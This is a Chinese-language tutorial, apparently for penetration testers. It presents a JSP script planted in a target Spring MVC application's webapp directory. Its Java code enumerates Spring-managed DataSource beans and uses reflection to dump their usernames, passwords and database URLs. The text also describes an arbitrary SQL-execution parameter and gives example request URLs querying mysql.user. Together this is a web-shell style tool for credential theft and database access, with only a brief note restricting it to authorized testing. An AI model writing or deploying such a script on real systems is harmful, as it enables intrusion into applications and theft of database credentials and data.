## 一、前言
在渗透目标系统时，查找数据库账号密码是常见需求，可通过 Spring MVC 的数据库配置信息实现。但目标系统若存在大量配置项，会增加获取数据库配置信息的成本，因此可借助专门脚本辅助获取 DataSource 账号密码。

## 二、核心代码
### （一）文件路径
`./项目/src/main/webapp/springMvcDataSource.jsp`

/**
* 获取所有Spring管理的数据源
* @param app Spring上下文对象
* @return 数据源数组
*/
public List<DataSource> getDataSources(ApplicationContext app) {
  List<DataSource> dataSourceList = new ArrayList<DataSource>();
  String[] beanNames = app.getBeanDefinitionNames();
  for (String beanName : beanNames) {
    Object object = app.getBean(beanName);
    if (object instanceof DataSource) {
      dataSourceList.add((DataSource) object);
    }
  }
  return dataSourceList;
}

/**
* 获取数据源配置信息
* @param app Spring上下文对象
* @return 获取数据源配置信息
* @throws NoSuchMethodException 反射调用时方法没找到异常
* @throws InvocationTargetException 反射调用异常
* @throws IllegalAccessException 反射调用时不正确的访问异常
*/
public List<LinkedHashMap<String, String>> getDataSourceConfig(ApplicationContext app) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
  List<LinkedHashMap<String, String>> result = new ArrayList<>();
  int i = 0;
  for (DataSource dataSource : getDataSources(app)) {
    i += 1;
    LinkedHashMap<String, String> dataSourceConfig = new LinkedHashMap<>();
    dataSourceConfig.put("id", String.valueOf(i));
    dataSourceConfig.put("className", dataSource.getClass().getName());
    Class c = dataSource.getClass();
    for (Method m : c.getMethods()) {
      if (m.getName().startsWith("get")) {
        if (m.getReturnType().toString().equals("class java.lang.String")) {
          dataSourceConfig.put(m.getName(), (String) c.getMethod(m.getName()).invoke(dataSource));
        }
      }
    }
    result.add(dataSourceConfig);
  }
  return result;
}

## 三、核心功能说明
### （一）获取数据源列表
通过 `getDataSources` 方法，遍历 Spring 上下文所有 Bean，筛选出 `DataSource` 类型的实例，存入列表返回。

### （二）获取数据源配置信息
`getDataSourceConfig` 方法利用反射机制，调用 DataSource 实例中以 `get` 开头的 String 类型返回值方法，获取用户名、密码、URL 等配置信息，封装成键值对存入集合。

### （三）SQL 执行功能
接收前端传入的 `id`（指定数据源）和 `sql`（待执行 SQL 语句）参数，通过指定数据源获取数据库连接，执行 SQL 查询并以表格形式展示结果，同时处理异常并关闭资源。

## 四、使用方法
### （一）参数说明

| **参数** | **作用** | **是否必选** | **备注** |
| --- | --- | --- | --- |
| id | 指定查询的数据源 | 否 | 与 sql 参数配合使用，不指定则所有数据源都执行 SQL |
| sql | 待执行的 SQL 语句 | 否 | 不传入则仅展示数据源配置信息 |


### （二）具体用法
1. **仅查看数据源配置信息**
    - 访问地址：`http://xxx.com/springMvcDataSource.jsp`
    - 示例结果：展示所有数据源的 id、类名、用户名、密码、数据库 URL 等配置。
2. **执行 SQL（所有数据源）**
    - 访问地址：`http://xxx.com/springMvcDataSource.jsp?sql=select * from mysql.user`
    - 示例结果：所有数据源均执行该 SQL，展示每个数据源的执行结果表格。
3. **指定数据源执行 SQL**
    - 访问地址：`http://xxx.com/springMvcDataSource.jsp?id=2&sql=select * from mysql.user`
    - 示例结果：仅 id 为 2 的数据源执行 SQL 并返回结果。

## 五、注意事项
1. 脚本需部署在目标 Spring MVC 项目的 `webapp` 目录下，确保能访问 Spring 上下文。
2. 需项目依赖 Spring 相关 Jar 包（如 `spring-context`、`spring-web`）及数据库驱动 Jar 包。
3. 执行 SQL 时需注意权限控制，避免恶意操作；仅在合法授权的渗透测试场景使用。
4. 若未获取到数据源配置信息，可能是项目无 Spring 管理的 DataSource 或配置权限限制。
